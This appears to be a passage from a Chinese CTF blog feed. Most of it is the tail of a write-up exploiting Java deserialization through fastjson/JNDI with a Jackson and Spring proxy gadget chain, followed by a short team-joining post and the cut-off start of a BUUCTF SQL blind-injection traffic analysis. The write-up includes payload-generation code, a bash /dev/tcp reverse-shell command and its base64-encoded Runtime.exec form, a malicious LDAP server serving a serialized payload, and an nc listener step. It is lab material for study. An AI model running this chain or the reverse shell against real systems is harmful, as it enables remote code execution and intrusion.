Class&lt;?&gt; clazz = Class._forName_(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templatesImpl);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy._newProxyInstance_(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxyObj);<span class="hljs-comment">//将代理对象包装进了一个 Jackson 节点，为后续的反序列化打包做准备</span><br>        <span class="hljs-comment">//封装进 BadAttributeValueExpException，将 Jackson 的 POJONode(proxyObj) 放进 exp 的 val 字段</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class._forName_(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(exp,jsonNodes);<br>        <span class="hljs-comment">//Java 原生序列化，并使用 Base64 编码输出</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(exp);<br>        objectOutputStream.close();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> Base64._getEncoder_().encodeToString(barr.toByteArray());<br>        System._out_.println(res);<br><br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意：</strong>使用 java 的 Runtime.getRuntime().exec 来反弹 shell 时需要注意分割的问题，参考<a href="https://www.cnblogs.com/BOHB-yunying/p/15523680.html">这篇文章</a>将命令用 base64 加密后放入语句内执行。例如 <code>bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code> 加密后放入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);<br></code></pre></td></tr></table></figure><p>ldap 服务端网上拿来略作修改，将上面输出的内容复制进去，等待连接并返回字节流</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.jndi;<br><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><span class="hljs-keyword">import</span> ysoserial.Serializer;<br><span class="hljs-keyword">import</span> ysoserial.payloads.CommonsCollections6;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ldap_evil_server</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String _LDAP_BASE _= <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( String[] tmp_args )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8888</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(_LDAP_BASE_);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>, <span class="hljs-comment">//$NON-NLS-1$</span><br>                    InetAddress._getByName_(<span class="hljs-string">&quot;0.0.0.0&quot;</span>), <span class="hljs-comment">//$NON-NLS-1$</span><br>                    port,<br>                    ServerSocketFactory._getDefault_(),<br>                    SocketFactory._getDefault_(),<br>                    (SSLSocketFactory) SSLSocketFactory._getDefault_()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>());<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System._out_.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="hljs-comment">//$NON-NLS-1$</span><br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            System._out_.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br><span class="hljs-comment">//calc      byte[] calcs = Base64.decode(&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAALXQAHmNvbS5kZW1vLmpuZGkudW5zZXJpYWxfamFja3NvbnQAFXVuc2VyaWFsX2phY2tzb24uamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAVeHNyACxjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5QT0pPTm9kZQAAAAAAAAACAgABTAAGX3ZhbHVlcQB+AAF4cgAtY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuVmFsdWVOb2RlAAAAAAAAAAECAAB4cgAwY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuQmFzZUpzb25Ob2RlAAAAAAAAAAECAAB4cHN9AAAAAQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgA0b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkpka0R5bmFtaWNBb3BQcm94eUzEtHEO65b8AgADWgANZXF1YWxzRGVmaW5lZFoAD2hhc2hDb2RlRGVmaW5lZEwAB2FkdmlzZWR0ADJMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvZnJhbWV3b3JrL0FkdmlzZWRTdXBwb3J0O3hwAABzcgAwb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkFkdmlzZWRTdXBwb3J0JMuKPPqkxXUCAAZaAAtwcmVGaWx0ZXJlZFsADGFkdmlzb3JBcnJheXQAIltMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvQWR2aXNvcjtMABNhZHZpc29yQ2hhaW5GYWN0b3J5dAA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc29yQ2hhaW5GYWN0b3J5O0wACGFkdmlzb3JzcQB+AAdMAAppbnRlcmZhY2VzcQB+AAdMAAx0YXJnZXRTb3VyY2V0ACZMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvVGFyZ2V0U291cmNlO3hyAC1vcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuUHJveHlDb25maWeLS/Pmp+D3bwIABVoAC2V4cG9zZVByb3h5WgAGZnJvemVuWgAGb3BhcXVlWgAIb3B0aW1pemVaABBwcm94eVRhcmdldENsYXNzeHAAAAAAAAB1cgAiW0xvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5BZHZpc29yO9+DDa3SHoR0AgAAeHAAAAAAc3IAPG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5EZWZhdWx0QWR2aXNvckNoYWluRmFjdG9yeVTdZDfiTnH3AgAAeHBzcgAUamF2YS51dGlsLkxpbmtlZExpc3QMKVNdSmCIIgMAAHhwdwQAAAAAeHNxAH4AFAAAAAB3BAAAAAB4c3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnRhcmdldC5TaW5nbGV0b25UYXJnZXRTb3VyY2V9VW71x/j6ugIAAUwABnRhcmdldHEAfgABeHBzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AAVMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAVbK/rq+AAAAMwAYAQABYQcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAFAAYKAAQACAEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BAARjYWxjCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBAApTb3VyY2VGaWxlAQAGYS5qYXZhACEAAgAEAAAAAAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAm4AA8SEbYAFVexAAAAAAABABYAAAACABdwdAAEdGVzdHB3AQB4&quot;);</span><br>            <span class="hljs-type">byte</span>[] calcs = Base64._decode_(<span class="hljs-string">&quot;rO0ABXNyACBXJ9o......省略&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, calcs);<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode._SUCCESS_));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动服务端后先在本地调试，从之前漏洞复现时无法进入的 <code>lookup</code> 步入看看</p><p><img src="/img/fastjsonAndJNDI/JWMAbYdTuoAWgdxI8LacqieynGb.png"></p><p>继续步入 <code>p_lookup()</code></p><p><img src="/img/fastjsonAndJNDI/LOnZbFEf4oIi80xoGclcyo6anFe.png"></p><p>继续步入 <code>c_lookup()</code></p><p><img src="/img/fastjsonAndJNDI/Y3DlbBLAqohAjGxtKQ2cLPlanNh.png"></p><p>步入 <code>doSearchOnce()</code></p><p><img src="/img/fastjsonAndJNDI/Nx31bD65Jo4VrbxdnzBcSFH3nce.png"></p><p>步入 <code>doSearch()</code></p><p><img src="/img/fastjsonAndJNDI/FrqebHkYfoIQgYxhx7EcfP1vnNf.png"></p><p>步入 <code>search()</code> 大概是查找指定目标</p><p><img src="/img/fastjsonAndJNDI/XjEJbxvo3oMoNcxZJF1cZPUMn7g.png"></p><p>到 <code>writeRequest()</code> 处会从 ldap 服务端获取数据流，服务端可以看到响应输出，360 也会在这个时候告警。后续多次步过，三次 return</p><p><img src="/img/fastjsonAndJNDI/X4aybhcIaogljYxabcgcozIQnfh.png"></p><p>回到 <code>c_lookup()</code>，接下来判断 <code>JAVA_ATTRIBUTES[2]</code> 即 <code>javaClassName</code> 是否为空</p><p><img src="/img/fastjsonAndJNDI/XNGqbLHmJopYLIxDPulcXuEQnDh.png"></p><p>当 <code>javaClassName</code> 存在时对目标进行解码，步入 <code>Obj.decodeObject()</code></p><p><img src="/img/fastjsonAndJNDI/Is2FbGZhQoAcujxkEkEciIi1nJh.png"></p><p><code>getCodebases()</code> 获取 <code>javaCodebase</code> 属性，我们没有使用，为空，继续步过</p><p><img src="/img/fastjsonAndJNDI/S6ohbiNUToceZPxY5IBcJ79gnch.png"></p><p>当属性 javaSerializedData 不为空时，<code>getURLClassLoader()</code> 根据 <code>javaCodebase</code> 属性获取加载器（空，选择默认加载器）返回 <code>deserializeObject()</code> 去反序列化，步入 <code>deserializeObject()</code></p><p><img src="/img/fastjsonAndJNDI/EBGtbem23owygvxk5plcMFVrnBb.png"></p><p>在这里进行原生反序列化，执行命令</p><p><img src="/img/fastjsonAndJNDI/Lh91bjWJwo4HmmxbryScFBIvns3.png"></p><p>接下来正式做题，还是把本地服务端端口映射到云服务器，向靶机发包</p><p><img src="/img/fastjsonAndJNDI/BWurbMSU2o1Upgxyhnbc0UBknYe.png"></p><p>本地服务端可以看到靶机的远程请求抵达了本地</p><p><img src="/img/fastjsonAndJNDI/EP48bd2sEoCHStxWFkmcBSapnV7.png"></p><p>云服务器上使用 <code>nc -lvvp 12345</code> 监听 12345 端口并显示详细信息，成功接收到反弹 shell</p><p><img src="/img/fastjsonAndJNDI/H54wbEctgoIW5wxSujTcJZULnKh.png"></p><p>查看一下基本情况，当前普通用户权限，根目录发现 flag</p><p><img src="/img/fastjsonAndJNDI/Ge9ibYoTWoQSpLxxhBWcZpJ5nTb.png"></p><p>flag 为 root 用户所有，无法 <code>cat flag</code>，使用命令 <code>find / -perm -4000 -type f 2&gt;/dev/null</code> 查找 SUID 文件，发现 <code>/readflag</code>（Oh No 眼瞎了…），<code>/readflag</code> 直接解决。</p><p><img src="/img/fastjsonAndJNDI/SWPXbwUk8oTTEAxfM8bcTZPon2f.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>JNDI 很多内容在流程分析时没有成功调试进去，然后就暂时先不管了，对于 JNDI 还有 Jackson 的学习还比较浅，后续有空的时候再专门研究一下它的原理和各种利用链、绕过方法，还需要找机会学习一下一般如何寻找利用链</p><p>另外，初学时偷懒不可取，本篇已经因此造成两次错误了</p><p>其实这一系列里面可学的可写的还很多，但是全写一起太乱了，有空的时间再整理总结一下（希望有罢）。</p><p>这一趟学习下来还收获、实践了几个小技巧：如何分析 jar 包，如何分析 jar 包使用的 jdk 版本，如何快速起一个 http 服务，以及对于 spring 项目如何获取可能有用的报错细节（将发包的 Accept 字段设为*&#x2F;*，spring 项目的详细报错信息一般会以 json 格式返回，当然这里的题用不到）</p><h1 id="主要参考资料汇总"><a href="#主要参考资料汇总" class="headerlink" title="主要参考资料汇总"></a>主要参考资料汇总</h1><ul><li>B 站视频，总结了 checkAutoType()整体的判断逻辑，画了流程图方便理解，复现的操作展示、调用过程分析跟着视频看会更好理解一些 <a href="https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.1387.homepage.video_card.click&vd_source=ae44e9df2e6bb265e83888153930e885">https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from&#x3D;333.1387.homepage.video_card.click&amp;vd_source&#x3D;ae44e9df2e6bb265e83888153930e885</a></li><li>这篇 fastjson 各个版本的漏洞分析都比较全面详细，fastjson 反序列化漏洞有些东西忘记了可以结合这篇和下面一篇查看 <a href="https://su18.org/post/fastjson/">https://su18.org/post/fastjson/</a></li><li>这篇 fastjson 各个版本的漏洞总结得也比较全面详细，可以结合上面一篇一起查看 <a href="https://www.freebuf.com/vuls/361576.html">https://www.freebuf.com/vuls/361576.html</a></li><li>这篇是 JNDI 的文章，主要是 JNDI 的概念和通过 rmi、ldap 的利用途径、高版本绕过，相较下一篇会更条例清晰简洁一些 <a href="https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</a></li><li>这篇也是 JNDI，主要是 JNDI 的前置知识和通过 rmi、ldap 的利用示例，和上一篇结合起来看 <a href="https://www.cnblogs.com/nice0e3/p/13958047.html">https://www.cnblogs.com/nice0e3/p/13958047.html</a></li><li>fastjson 反序列化相关不出网利用的 CTF 例题，不是很懂，拓展学习一下 <a href="https://www.anquanke.com/post/id/283079">https://www.anquanke.com/post/id/283079</a></li><li>SnakeYaml 的反序列化，拓展一下 <a href="https://tttang.com/archive/1815/#toc_spi">https://tttang.com/archive/1815/#toc_spi</a></li><li>高版本 Tomcat 的 JNDI 利用拓展一下 <a href="https://xz.aliyun.com/news/16156">https://xz.aliyun.com/news/16156</a></li><li>fastjson 各种利用链总结，比较清晰 <a href="http://www.bmth666.cn/2022/04/11/Fastjson%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2022/04/11/Fastjson%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html</a></li><li>JNDI 总结，相对全面详细 <a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a></li><li>高版本 JNDI 注入思路总结，目录很清晰 <a href="https://www.cnblogs.com/R0ser1/p/17105579.html">https://www.cnblogs.com/R0ser1/p/17105579.html</a></li><li>简洁的 Jackson 这条利用链的 payload 和一道题的解析，还有其他 java 相关的总结 <a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson">https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson</a></li><li>Jackson 原生反序列化的分析 <a href="https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/">https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
      <tag>反序列化</tag>
      
      <tag>java</tag>
      
      <tag>fastjson</tag>
      
      <tag>JNDI</tag>
      
      <tag>绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oh Yeah ~</title>
    <link href="/2025/03/23/OhYeah/"/>
    <url>/2025/03/23/OhYeah/</url>
    
    <content type="html"><![CDATA[<h1 id="加入Vidar-Team啦！"><a href="#加入Vidar-Team啦！" class="headerlink" title="加入Vidar-Team啦！"></a>加入Vidar-Team啦！</h1><p>经过我的努力奋斗和协会大佬的提携我终于加入了Vidar-Team！</p><p><img src="/img/OhYeah/1.jpg" alt="邀请函！"></p><p><img src="/img/OhYeah/2.jpg" alt="嘿嘿，协会周边"></p><p>完成一个重要目标，日后再接再励！！！</p><blockquote><p><em><p style="text-align:center"><span  style="font-size:1.0em;">Keep going !</span></p></em></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>I&#39;m...</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF SQL 刷题</title>
    <link href="/2025/03/12/BUUCTF%20SQL%E5%88%B7%E9%A2%98/"/>
    <url>/2025/03/12/BUUCTF%20SQL%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-SQL-刷题"><a href="#BUUCTF-SQL-刷题" class="headerlink" title="BUUCTF SQL 刷题"></a>BUUCTF SQL 刷题</h1><h1 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h1><p>分析流量包，可以看出是布尔型 SQL 盲注的过程，注入语句不再具体分析，这里复习一下 wireshark 的使用</p><p>找到正确时的响应包</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/OusVbMRC4o51aWxF61IcewiPnve.png"></p><p>根据内容长度筛选</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/FrLJbUgCso9fGvxBcohcsnazn8g.png"></p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/JGMbbFkWkopOCgxmVEwcUQB2nVf.png"></p><p>响应包中可以看到请求的 url</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/J6zFbtwv7oEN8WxiaR0ce5tZnub.png"></p><p>导出所有符合要求的响应包内容</p><p><img src="/img/BUUCTF_SQL%E5%88%B7%E9%A2%98/NTDAbbVUbohPwuxFl4Vc8FEmnLe.png"></p><p>写一个脚本正则匹配提取信息并输出 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sql.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>flag = [<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>)]<br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> f.readlines():<br>    num = re.search(<span class="hljs-string">r&quot;limit%200,1\)\),%20(\d+),%201\)\)&quot;</span>,l)<br>    part = re.search(<span class="hljs-string">r&quot;,%201\)\)&gt;(\d+)]&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> num <span class="hljs-keyword">and</span> part:<br>        flag[<span class="hljs-built_in">int</span>(num.group(<span class="hljs-number">1</span>))] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(part.group(<span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>)<br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    <span 